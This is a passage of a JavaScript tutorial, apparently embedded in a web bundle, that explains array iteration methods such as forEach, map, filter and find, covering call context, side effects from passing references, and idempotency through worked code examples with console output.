second argument of the method\n\nEach method can take two arguments: a function and a reference to it's call context.\nIn fact, the second argument of the method saves us from the need to bind the call context to the function-argument.\n\n◘◘ ![ico-25 cap] ** 4** ◘◘\n~~~js\nconst numbers = [8, 4, 9, 7]\nconst alter = [7, 5, 0, 11]\n\nArray.prototype.iterate = function (callback, context) {\n  const res = []\n  for (const item of this) {\n    res.push(callback.call(context, item, this.indexOf(item), this))\n  }\n  return res\n}\n\nconst sample = numbers.iterate(function (item, index, arr) {\n  return this[index] + arr[index]\n}, alter)\n\nconsole.log(sample)\n~~~\n\nResult:\n\n~~~console\n► (4) [15, 9, 9, 18]\n~~~\n\n_______________________\n\n◘◘ ![ico-25 cap] ** 5** ◘◘\n~~~js\nconst numbers = [8, 4, 9, 7]\nconst alter = [-4, 1, -2, 0]\n\nArray.prototype.iterate = function (callback, context) {\n  const res = []\n  const func = callback.bind(context)\n  for (const item of this) res.push(func(item))\n  return res\n}\n\nconst sample = numbers.iterate(function (item) {\n  return item + this.shift()\n}, alter)\n\nconsole.log(sample)\n~~~\n\nResult:\n\n~~~console\n► (4) [4, 5, 7, 7]\n~~~\n\nHowever, there is a **side effect** - the array **~alter~** is now empty:\n\n~~~js\nconsole.log(alter) // []\n~~~\n\nAnother inconvenience is that in this case we cannot pass _arrow functions_ to the method, since their call context cannot be changed.\nHowever, _arrow functions_ make the code more concise.\n\n_____________________________________\n\n### ![ico-20 icon] Reference to the source array\n\n**function-argument** has three optional formal parameters.\nThe first is the **current element** of the array.\nThe second is the **index** of the current array element.\nThe third is a reference to the original array.\n\nPassing this “master key” to the **function-argument** destroys the functional purity of the method and creates opportunities for **side effects**.\n\nThe following example shows how this works.\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst numbers = [8, 4, 9, 7]\n\nArray.prototype.iterate = function (func) {\n  const res = []\n  let index = 0\n  for (const item of this) {\n    res.push(func(item, index++, this))\n  }\n  return res\n}\n\nconst sample = numbers.iterate((item, index, arr) => item * index - arr[0])\n\nconsole.log(sample)\n~~~\n\nResult:\n\n~~~console\n► (4) [-8, -4, 10, 13]\n~~~\n\n^^The function **sample** receives a reference to the source array **numbers** in the variable **arr**.^^\n\n___________________________________________________\n\n## ![ico-25 icon] Side effects\n\n![ico-20 warn] Pure functions, as iterative methods are supposed to be, do not generate **side effects**, i.e. no _external variables are mutated_.\nArray iterating methods are **higher-order functions** that iterate over a source array, passing one array element at a time as an argument to the function.\nThus, the **function-argument** does not have a reference to the original array itself, and cannot mutate it.\n_______________________\n![ico-20 warn] Except the cases when the elements of the source array have a reference data type, i.e. The function-argument receives not a value but a reference to an array element.\n______________________\nThe original array, as a rule, does not change.\nThat is, they were originally supposed to be **pure functions** that do not generate external effects, which distinguishes them from ordinary array methods such as ~push()~, ~concat()~, etc.\n\nBut we have already shown earlier that this functional purity is violated by passing references (the reference to the call context of function-argument or the reference to the source array).\n\nSimilarly, if we are dealing with **deep data structures**, then it is not values ​​that are passed, but references, which creates the possibility of **side effects**.\n\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\nconst users = [\n  { name: 'Helen', age: 25 },\n  { name: 'Robert', age: 18 },\n  { name: 'Mary', age: 20 },\n  { name: 'Piter', age: 30 }\n]\n\nArray.prototype.iterate = function (func) {\n  for (const item of this) func(item)\n}\n\nusers\n  .iterate(user => user.age++)\n~~~\n\nIn this example, we are iterating over an array of objects, i.e. we are dealing with a **deep data structure**.\nAt each iteration, the argument function (~user => user.age++~) of the **~iterate~** method receives a reference to the object.\nThis gives to it the ability to mutate the original array, since\n\n☼☼☼ reference is a lockpick ☼☼☼\n\nAs a result of executing the code, the **users** array will look like this:\n\n~~~console\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {name: 'Helen', age: 26}\n  ► 1: {name: 'Robert', age: 19}\n  ► 2: {name: 'Mary', age: 21}\n  ► 3: {name: 'Piter', age: 31}\n    length: 4\n  ► [[Prototype]]: Array(0)\n~~~\n\nWe see that the age of all users has changed, although we did not pass a link to the original array **users**.\nBut the array **users** is a **_deep data structure_** and its elements have **reference data type**,\ntherefore, the function-argument (~user => user.age++~) of the **~iterate~** method received a “master key” and was able to mutate objects by reference.\n\nSo, **side effects** arise from **passing references instead of values**.\n\n_____________________________________________\n\nThe following example shows that you can mutate the argument function itself:\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\nvar browsers = ['Chrome', 'FireFox', 'Opera', 'Safari', 'Edge']\n\nconst storeItem = function (item, index, arr) {\n  this.history = Array.isArray(this.history) ? this.history : []\n  this.history.push(item)\n}\n\nArray.prototype.iterate = function (func) {\n  for (var item of this) func.call(func.prototype, item)\n}\n\nbrowsers.iterate(storeItem, storeItem)\n\nconsole.dir(storeItem)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ƒ storeItem(item, index, arr)\n  ▼ history: Array(5)\n      0: \"Chrome\"\n      1: \"FireFox\"\n      2: \"Opera\"\n      3: \"Safari\"\n      4: \"Edge\"\n      length: 5\n    ► __proto__: Array(0)\n    arguments: null\n    caller: null\n    length: 3\n    name: \"storeItem\"\n  ► prototype: {constructor: ƒ}\n  ► __proto__: ƒ ()\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Idempotency\n\nIf a method every time being called returns the same result with the same argument values, then it is **_idempotent_**.\n\n^^i.e. when calling a method with the same array and function repeatedly, the result will always be the same.^^\n\nIn object-oriented languages, method idempotency is practically unattainable if the function arguments have a **reference data type**.\nBecause arrays have a **reference data type**, array iterating methods operate with a reference.\nThe reference remains the same, but from one method call to the next, the contents of the array may have changed, which will affect the result.\n\nLet's try to create an idempotent method:\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\n\nArray.prototype.idempotence = function (func) {\n  const res = []\n  if (!this.initialState) this.initialState = JSON.parse(JSON.stringify(this))\n  for (const item of this.initialState) res.push(func(item))\n  return res\n}\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nResult:\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\nThe first time the **~idempotence~** method is called with a given array, the method mutates the array by adding an ~initialState~ property to it and storing a reference to the initial state of the array in this property.\n\nWhen called again, the method ignores all changes that may have occurred to the array during the time between the first and second method calls, and works with the clone ~initialState~.\n\n~~~js\nnumbers[6] = 125\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nResult:\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\nNote that the method will return a **_new reference_** each time, since each time the method is called it creates a new array, but the contents of this array will be the same.\n\nFor the purity of the experiment, you can return the JSON string:\n\n~~~js\nArray.prototype.idempotence = function (func) {\n  const res = []\n  if (!this.initialState) this.initialState = JSON.parse(JSON.stringify(this))\n  for (const item of this.initialState) res.push(func(item))\n  return JSON.stringify(res)\n}\n~~~\n\nHowever, in this example we used the idempotent function-argument **~Math.sqrt~**.\n\nIf we pass a function-argument that is not idempotent to the **~idempotence~** method, the method will not be idempotent because it will return a different result when called with the same set of arguments:\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(Math.random() * 100))\n~~~\n\nIn this example, you can see that if the function-argument that we pass to the **~idempotence~** method is not _idempotent_, then the result of the method will vary, i.e. the idempotency of a method directly depends on the idempotency of the **function-argument**.\n\nLet's try to fix this situation:\n\n◘◘![ico-20 cap] **10**◘◘\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\n\nArray.prototype.idempotence = function (func) {\n  if (!this.initialState) {\n    this.result = []\n    this.initialState = JSON.parse(JSON.stringify(this))\n    for (const item of this.initialState) this.result.push(func(item))\n  }\n\n  return JSON.stringify(this.result)\n}\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nResult:\n\n~~~console\n'[5,4,3,7,9,8,2]'\n~~~\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(Math.random() * 100))\n~~~\n\nResult:\n\n~~~console\n'[5,4,3,7,9,8,2]'\n~~~\n_________________________________________\n\nTry to figure out the following example on your own.\n\n~~~~js\nArray.prototype.idempotence = function (func) {\n  const funcArg = func.toString()\n  try {\n    var sourceData = JSON.stringify(this)\n  } catch (err) {\n    console.warn(err)\n    return null\n  }\n\n  const self = this.__proto__\n\n  if (!self.funcs) self.funcs = []\n  if (!self.data) self.data = []\n  if (!self.results) self.results = []\n\n  if (!self.funcs.includes(funcArg)) self.funcs.push(funcArg)\n  if (!self.data.includes(sourceData)) self.data.push(sourceData)\n\n  const index = self.funcs.indexOf(funcArg)\n  const num = self.data.indexOf(sourceData)\n\n  if (!self.results[num]) self.results[num] = []\n\n  if (!self.results[num][index]) {\n    const result = []\n    for (const item of this) {\n      result.push(func(item))\n    }\n    self.results[num][index] = result\n  }\n\n  return self.results[num][index]\n}\n~~~~\n\n^^^[try]\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\nnumbers.idempotence(Math.sqrt)\n~~~\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\n~~~js\n[25, 16, 9, 49, 81, 64, 4].idempotence(Math.sqrt)\n~~~\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(item + Math.random() * 100))\n~~~\n\n~~~console\n► (7) [87, 98, 42, 128, 184, 152, 79]\n~~~\n\n~~~js\nconst randomize = item => item + Math.floor(item + Math.random() * 100)\n[25, 16, 9, 49, 81, 64, 4].idempotence(randomize)\n~~~\n\n~~~console\n► (7) [87, 98, 42, 128, 184, 152, 79]\n~~~\n^^^\n_____________________________________________\n\n## ![ico-25 icon] Examples\n\nPassing the Call Context\n\n◘◘![ico-20 cap] **12**◘◘\n~~~js\nconst jobs = [\n  'developer',\n  'worker',\n  'salesman',\n  'manager'\n]\n\nconst users = [\n  { name: 'Piter', job: 1 },\n  { name: 'Helen', job: 2 },\n  { name: 'Robert', job: 0 },\n  { name: 'Michael', job: 1 },\n  { name: 'Andrew', job: 0 },\n  { name: 'Mary', job: 2 },\n  { name: 'Gregory', job: 3 },\n]\n\nArray.prototype.iterate = function (func, context) {\n  if (typeof func !== 'function') throw new TypeError('First argument should be the function.')\n\n  const result = []\n  for (const item of this) result.push(func.call(context, item))\n  return result\n}\n\nfunction showUser (user) {\n  return `<p>${user.name}: ${this[user.job]}</p>`\n}\n\ndocument.body\n  .appendChild(document.createElement('div'))\n  .innerHTML = users.iterate(showUser, jobs).join('')\n~~~\n\n_____________________________\n\nPassing the second (optional) parameter (the index of the current array element) to the function-argument.\n\n◘◘![ico-20 cap] **13**◘◘\n\n~~~js\nconst salary = [4000, 3200, 4500, 2800, 3500, 2400, 3700]\n\nconst workers = ['Piter', 'Helen', 'Robert', 'Michael', 'Andrew', 'Mary', 'Gregory']\n\nArray.prototype.iterate = function (func, context) {\n  if (typeof func !== 'function') throw new TypeError('First argument should be the function.')\n\n  const result = []\n  index = 0\n  for (const item of this) result.push(func.call(context, item, index++))\n  return result\n}\n\nfunction showSalary (worker, index) {\n  return `<p>${worker}: ${this[index]}</p>`\n}\n\ndocument.body\n  .appendChild(document.createElement('div'))\n  .innerHTML = workers.iterate(showSalary, salary).join('')\n~~~\n\n__________________________________________\n\n◘◘![ico-20 cap] **14**◘◘\n\n~~~js\nconst arr = [\n  'google',\n  'service',\n  'user',\n  () => Math.round(Math.random() * 1000),\n  false\n]\n\nfunction test (elem, index, ref) {\n  typeof elem === 'function' && ref.splice(index, 1, elem())\n  return ref[index]\n}\n\nArray.prototype.iterate = function (func) {\n  var res = []\n  for (var item of this) res.push(func(item, this.indexOf(item), this))\n  return res\n}\n\narr.iterate(test)\n~~~\n__________________________________________\n\nLet's use the second and third optional parameters of the argument function:\n\n◘◘![ico-20 cap] **15**◘◘\n\n~~~js\nconst companList = ['Google', 'Mozilla', 'Microsoft']\nconst browsers = ['Chrome', 'Firefox', 'Edge']\n\nfunction test (prop, index) {\n  this[index] = { [prop] : this[index] }\n}\n\nArray.prototype.iterate = function (func, context) {\n  var index = index && typeof index === 'number' ? index : 0\n  for (var item of this) func.call(context, item, index++)\n}\n\ncompanList.iterate(test, browsers)\n\nconsole.log(browsers)\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n▼ (3) [{…}, {…}, {…}]\n  ► 0: {Google: \"Chrome\"}\n  ► 1: {Mozilla: \"Firefox\"}\n  ► 2: {Microsoft: \"Edge\"}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n________________________________________________________________\n\n\n[◄◄◄Array iterating methods◄◄◄](page/Array-iterating-methods.md)\n\n________________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/arrayIterationMethods)\n"},64497:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Array iterating methods\n\nThese methods teach us to think within the **functional paradigm**.\n\nAll array iterating methods are **higher-order functions**.\n\n![ico-20 exclamation] The required first argument of each method is **function**.\n![ico-20 warn] If, when calling a method, the first argument is not a function, an exception **TypeError** will be generated.\n^^The second argument of the method is optional; it is a reference to the call context of the **function-argument**.^^\n\nEssentially, iterating methods are a functional \"wrapper\" for the **~for...of~** loop.\nEach method sequentially iterates through the elements of the array from the first to the last, and at each iteration calls the **argument-function** passed to it.\n\nThe **function-argument** of the method has three optional formal parameters:\n1) current array element.\n2) index of the current array element.\n3) a reference to an iterable array.\n\n[►►►Let's look deeper?►►►](page/Array-iterating-methods-theory.md)\n\n_____________________________________________________\n\n## ![ico-30 icon] forEach()\n\n![ico-20 warn] This method does not return any value.\nLet's compare the behaviour of this method with the functioning of the **~for...of~** loop.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst  people = ['Ivan', 'Mary', 'Elena', 'Andrey']\n\npeople.forEach(currentName => console.log(currentName))\n\nfor (const currentName of people) console.log(currentName)\n~~~\n\n^^Here we iterate over the **people** array using the **~forEach~** method.^^\n^^The **~forEach~** method is passed an anonymous function as an argument:^^\n\n~~~js\ncurrentName => console.log(currentName)\n~~~\n\nIn this example, the result of the **~forEach~** method and the **~for...of~** loop operator will be identical.\nHowever, in various situations it is more convenient for us to use either the **~for...of~** operator or the **~forEach~** method.\nSince the **~forEach~** method does not return any value, there seems to be no point in using it in chain calculations.\nThen what is its advantage over the **~for...of~** operator?\n\nIf you learn to think in the functional paradigm, the advantage of the method over the operator will become obvious to you.\nBut even if we don’t talk about how much more convenient methods are than operators, there are a number of additional advantages of the **~forEach~** method over the **~for...of~** loop.\nFor example, the **~forEach~** method passes the **function-argument** not only the value of the array element, but also its index.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst  people = ['Ivan', 'Mary', 'Elena', 'Andrey']\n\npeople.forEach((currentValue, index) => console.log(`${index + 1}: ${currentValue}`))\n~~~\n\n~~~console\n1: Ivan\n2: Mary\n3: Elena\n4: Andrey\n~~~\n_______________________________\n\n![ico-25 warn] If you are not yet familiar with async-stuff (promises and asynchronous functions), then come back to the next example later.\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', age: 25, job: 'dev' },\n  { name: 'Piter', age: 37, job: 'worker' },\n  { name: 'Robert', age: 28, job: 'journalist' },\n  { name: 'Stephan', age: 40, job: 'manager' }\n]\n\nconst show = user => new Promise(resolve => setTimeout(() => resolve(user.name), Math.random() * 3000))\n\nusers.forEach(async user => console.log(await show(user)))\n~~~\n\nIn this example, we simulate the delay associated with retrieving user data from a remote server using the **show** function, which returns a ~promise~.\n\nBy passing an asynchronous anonymous function to the **~forEach~** method, we ensure sequential output of user names from the array.\n\n~~~console\nMary\nRobert\nStephan\nPiter\n~~~\n\nNow let's use the **~for...of~** operator:\n\n~~~js\nfor (const user of users) {\n  show(user).then(name => console.log(name))\n}\n~~~\n\nAs we can see, user names are displayed in random order:\n\n~~~console\nStephan\nMary\nRobert\nPiter\n~~~\n\nAnd in order to preserve the order of user names in accordance with their index in the array, we have to “wrap” the loop operator in an asynchronous function:\n\n~~~js\nasync function showUsers (users) {\n  for (const user of users) {\n    console.log(await show(user))\n  }\n}\n\nshowUsers(users)\n~~~\n\n~~~console\nMary\nRobert\nStephan\nPiter\n~~~\n\nThe question arises, why do this if we already have a functional “wrapper” for the **~for...of~** loop?\n_____________________\n\nIt should also be noted that sometimes using the loop operator **~for...of~** is more convenient than calling the **~forEach~** method.\nFor example, if you want to use the **~continue~** | **~break~** operators, then your choice is the **~for...of~** operator.\n\n__________________________________________\n\nThe third formal parameter of **function-argument** is quite problematic.\nIt is a reference to the original array.\nAnd we know that\n\n☼☼☼ reference is a lockpick ☼☼☼\n\nPassing a reference creates the ability to mutate the original array:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\n\nnumbers.forEach((numb, ind, res) => res[ind] = numb * 2)\n\nconsole.log(numbers) // [ 16, 8, 18, 14 ]\n~~~\n\n^^those. the original **numbers** array has been modified.^^\n\nBy providing the **function-argument** of the method with access to the source array by reference, we create the possibility of **side effects** associated with possible mutations of the source array.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst users = ['Mary', 'Piter', 'Robert', 'Stephan']\n\nusers.forEach((name, index, arr) => console.log(arr.pop()))\n~~~\n\nPerhaps you expected to see a complete list of users in the console, but you only saw the last two names from the array:\n\n~~~console\nStephan\nRobert\n~~~\n\nIn this case, only the first two names remain in the **users** array:\n\n~~~js\nconsole.log(users)\n~~~\n\n~~~console\n► (2) ['Mary', 'Piter']\n~~~\n\nThis is a side effect of mutating the **users** array.\nAt each iteration, the length of the array is reduced by 1, and the **~forEach~** method compares the current index value with the length of the array, and stops the loop when the index value becomes equal to the length of the array. After two iterations, the index value will be 2, and the length of the array will also be 2.\n\n___________________________\n\n@@@@\nMutations of the source array can occur even without passing a reference to the source array. This is due to the fact that if the array elements have a **reference data type**, then the **function-argument** of the method will receive not a value, but a ~reference~, and this creates the possibility of mutations of array elements by ~reference~.\n![](images/reference-is-a-lockpick.png)\n@@@@\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', age: 25, job: 'dev' },\n  { name: 'Piter', age: 37, job: 'worker' },\n  { name: 'Robert', age: 28, job: 'journalist' },\n  { name: 'Stephan', age: 40, job: 'manager' }\n]\n\nusers.forEach(user => console.log(`${user.name}: ${++user.age}`))\n~~~\n\n~~~console\nMary: 26\nPiter: 38\nRobert: 29\nStephan: 41\n~~~\n\n_________________________________________________\n\n### ![ico-25 icon] Function-argument call context\n\nThe **~forEach~** method, like almost all other array iterating methods, can take an additional argument - a reference to the ~call context~ to the **function-argument**.\n\n![ico-20 warn] However, the function passed to the method as an argument must not be an arrow function.\n\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 6]]\n\nintervals.forEach(function (interval) { console.log(this) }, intervals)\n~~~\n\n^^As a result of executing this code, the console will display an array **~intervals~**.^^\n^^In fact, passing a second argument to a method is equivalent to binding the context:^^\n\n~~~js\nintervals.forEach(function (interval) { console.log(this) }.bind(intervals))\n~~~\n\n^^Therefore, when using an arrow function whose context cannot be changed, we will see the **~window~** object in the console.^^\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 6]]\n\nintervals.forEach(interval => console.log(this), intervals)\n~~~\n\n_____________________\n\n^^Suppose we want to pass a reference to the array **~res~**, where the results of calculations should be placed:^^\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\nconst res = []\n\nnumbers.forEach(function (numb, ind) {\n  this.push(numb * ind)\n}, res)\n~~~\n\n^^Such operations do not make much sense, since for this we have the <a href=\"#map()\">![ico-20 link]**map**</a> method, which will be discussed later.^^\n\n_________________________________\n\n\n### ![ico-20 icon] Examples with the forEach method\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nconst tags = ['figure', 'div', 'h3', 'img']\nconst attrs = [\n  {\n    id: 'figure-blue',\n    style: 'padding: 48px; background: #09b;'\n  },\n  {\n    id: 'figure-yellow',\n    style: 'padding: 16px; background: #fa0;'\n  },\n  {\n    style: 'color: #fff; font-family: Arial; font-weight: bold',\n    innerText: 'Welcome, students!'\n  },\n  {\n    src: 'https://pictogrammers.com/images/libraries/mdi.svg',\n    width: 64\n  }\n]\n\nconst parents = [null, 'figure-blue', 'figure-yellow', 'figure-yellow']\n\ntags.forEach((tag, index) => {\n  const elem = (parents[index] ? document.getElementById(parents[index]) : document.body)\n    .appendChild(document.createElement(tag))\n  Object.assign(elem, attrs[index])\n})\n~~~\n\n{{{Array-iteration-methods-1.js}}}\n\n_____________________\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\n['zero', 'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight', 'nine']\n  .forEach((item, index) => Object.assign(window, {\n      [item]: arg => typeof arg === 'function' ? arg(index) : index\n  }))\n~~~\n\n^^In this example, we use the **~forEach~** method to create an array of functions named^^\n^^\"zero\", \"one\", \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\".^^\n\n^^Each of these functions checks the type of the **~arg~** argument passed to it,^^\n^^and if it is ~function~, then it calls **~arg~**,^^\n^^passing it its own sequence number (0, 1, 2 ...) as an argument,^^\n^^otherwise, it returns a number - its sequence number (0, 1, 2 ...).^^\n\n{{{Array-iteration-methods-2.js}}}\n\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .forEach((item, index) => Object.assign(window, {\n    operations: ['+', '-', '/', '*'],\n    [item]: function () {\n      return arguments.length === 2\n        ? eval(`arguments[0] ${this.operations[index]} arguments[1]`)\n        : window[item].bind(null, arguments[0])\n    }\n  }))\n~~~\n\n^^In this example, we create another array of functions named \"plus\", \"minus\", \"divide\", \"multiply\".^^\n^^Each of these functions has two formal parameters,^^\n^^so the first thing it does is check the length of the **~arguments~** object,^^\n^^and if the length is 2, then performs the corresponding operation on the arguments^^\n^^(adds, subtracts, multiplies, divides).^^\n^^Otherwise, returns the curried function,^^\n^^whose first argument is already “stitched”,^^\n^^and which can be called with one (missing second) argument.^^\n\n{{{Array-iteration-methods-3.js}}}\n\n____________________\n\n![ico-25 memo] Exercise\n\n^^Figure out for yourself what the following code does:^^\n\n~~~js\nconst callback = rule => console.log(rule)\n\nArray.from(document.styleSheets)\n  .forEach(sheet => sheet.href && Array.from(sheet.cssRules).forEach(callback))\n~~~\n\n______________________\n\n## ![ico-30 icon] map()\n\nThis method returns a new array.\nThe elements of the new array will be the values ​​returned by the **function-argument** at each iteration.\nThe method **argument-function** must return a new value (the ~return~ operator must be present).\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', birthYear: 1998 },\n  { name: 'Piter', birthYear: 2001 },\n  { name: 'Robert', birthYear: 2004 },\n  { name: 'Helen', birthYear: 1999 },\n  { name: 'Stephan', birthYear: 2002 },\n]\n\nusers.map(user => `${user.name}: ${new Date().getFullYear() - user.birthYear}`)\n~~~\n\n~~~console\n► (5) ['Mary: 26', 'Piter: 23', 'Robert: 20', 'Helen: 25', 'Stephan: 22']\n~~~\n_______________________________\n\nJust like in the **~forEach()~** method, in the **~map()~** method, the argument function has three optional formal parameters.\n\n![ico-20 green-ok] The **arr** argument will contain a reference to the source array.\n![ico-20 green-ok] The **index** argument is the iteration counter, or the index of the current element of the array being iterated.\n\n~~~js\nconst users = [\n  { name: 'Mary', birthYear: 1998 },\n  { name: 'Piter', birthYear: 2001 },\n  { name: 'Robert', birthYear: 2004 },\n  { name: 'Helen', birthYear: 1999 },\n  { name: 'Stephan', birthYear: 2002 },\n]\n\nusers.map((user, index, arr) => {\n  const olders = arr\n    .map(human => human.birthYear > user.birthYear ? human.name : null)\n    .join(' ')\n  return `${user.name} is younger then ${olders}`\n})\n~~~\n\n~~~console\n▼ (5) [...]\n  0: \"Mary is younger then  Piter Robert Helen Stephan\"\n  1: \"Piter is younger then   Robert  Stephan\"\n  2: \"Robert is younger then     \"\n  3: \"Helen is younger then  Piter Robert  Stephan\"\n  4: \"Stephan is younger then   Robert  \"\n  length: 5\n  ► [[Prototype]]: Array(0)\n~~~\n\n______________________________________________\n\n### ![ico-20 icon] Examples with the ~map~ method\n\nGo to [![ico-20 link] **_link_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018 )\n\nIn the new tab console, run the code:\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nlocation.search\n  .slice(1).split(',')\n  .map(x => ({ [x.split('=')[0]] : x.split('=')[1] }))\n~~~\n\nYou should get the result:\n\n~~~console\n▼ (2) [{…}, {…}]\n  ► 0: {name: \"garevna\"}\n  ► 1: {date: \"10.07.2018\"}\n    length: 2\n  ► __proto__: Array(0)\n~~~\n\n______________________________________________\n\nGo to [![ico-20 link] **_link_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018 )\n\nNow in the new tab console, declare the function:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nfunction getSearchObject () {\n  var obj = {}\n  location.search.slice(1).split(',')\n    .map(x => x.split('='))\n    .map (function (item) { this[item[0]] = item[1] }, obj)\n  return obj\n}\n~~~\n\nCall the **~getSearchObject~** function.\n\nYou should get the result:\n\n~~~console\n▼ {name: \"garevna\", date: \"10.07.2018\"}\n    date: \"10.07.2018\"\n    name: \"garevna\"\n  ► __proto__: Object\n~~~\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\n;['plus', 'minus', 'divide', 'multiply']\n  .map((item, index) => Object.assign(window, {\n    [item] () {\n      const operations = ['+', '-', '/', '*']\n      return arguments.length === 2\n        ? eval(`arguments[0] ${operations[index]} arguments[1]`)\n        : window[item].bind(null, arguments[0])\n    }\n  }))\n~~~\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst funcs = [\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 1\n    for (const arg of arguments) res *= parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseInt(arg) || 0\n    return res\n  }\n]\n\nFunction.prototype.currying = function (arg, context) {\n  return this.bind(context, arg)\n}\n\nfuncs\n  .map(func => func.currying(2.5))\n  .map(func => func.currying(2))\n  .map(func => func.currying(4.5))\n  .map(func => func())\n~~~\n\n~~~console\n▼ (3) [9, 22.5, 8]\n    0: 9\n    1: 22.5\n    2: 8\n    length: 3\n  ► [[Prototype]]: Array(0)\n~~~\n__________________________\n\n## ![ico-25 icon] filter()\n\nThe **~filter()~** method iterates the array, checking that the specified condition is satisfied for each element of the array.\nThe method returns a new array.\nThe resulting array will contain only those elements that satisfy the filtering condition.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar sourceArray = [\n  { name: 'Mykola Vasilenko', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Shveik', country: 'France' },\n  { name: 'Semyon Kartko', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Pilip Danko', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nvar usa = sourceArray.filter(x => x.country === 'USA')\n\nconsole.log(usa)\n~~~\n\n◘◘**Result**◘◘\n\n~~~console\n\n▼ (3) [{…}, {…}, {…}]\n  ► 0: {name: \"Duke Shane\", country: \"USA\"}\n  ► 1: {name: \"Margaret Johnson\", country: \"USA\"}\n  ► 2: {name: \"Robert Trump\", country: \"USA\"}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n______________________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst getTransactionMode = (() => {\n  const transactions = {\n    readwrite: ['add', 'put', 'delete', 'clear'],\n    readonly: ['get', 'getAll', 'getKey', 'getAllKeys']\n  }\n  return function (transaction) {\n    const res = ['readwrite', 'readonly']\n      .filter(mode => transactions[mode].includes(transaction))\n    return res[0] || new TypeError('Invalid transaction')\n  }\n})()\n\ngetTransactionMode('add')          // 'readwrite'\ngetTransactionMode('getAllKeys')  // 'readonly'\n~~~\n\n_________________________________\n\n## ![ico-25 icon] find()\n\nThe method searches the array and returns the first found element that satisfies the given condition.\n\nIf there is no such element in the array, returns ~undefined~.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.find(card => card.cash > 4000)\n~~~\n\n◘◘**Result**◘◘\n\n~~~console\n▼ { num: \"457811714\", cash: 5000 }\n    cash: 5000\n    num: \"457811714\"\n  ► __proto__: Object\n~~~\n\n___________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst getTransactionMode = (() => {\n  const transactions = {\n    readwrite: ['add', 'put', 'delete', 'clear'],\n    readonly: ['get', 'getAll', 'getKey', 'getAllKeys']\n  }\n  return function (transaction) {\n    const res = ['readwrite', 'readonly']\n      .find(mode => transactions[mode].includes(transaction))\n    return res || 'unacceptable'\n  }\n})()\n\ngetTransactionMode('add')          // 'readwrite'\ngetTransactionMode('getAllKeys')  // 'readonly'\n~~~\n\n_________________________\n\n## ![ico-25 icon] findIndex()\n\nLike ~find()~ method, it searches the array for the first element that satisfies the specified condition.\nHowever, it does not return the element itself, but its index.\n\nIf no such element is found in the array, returns 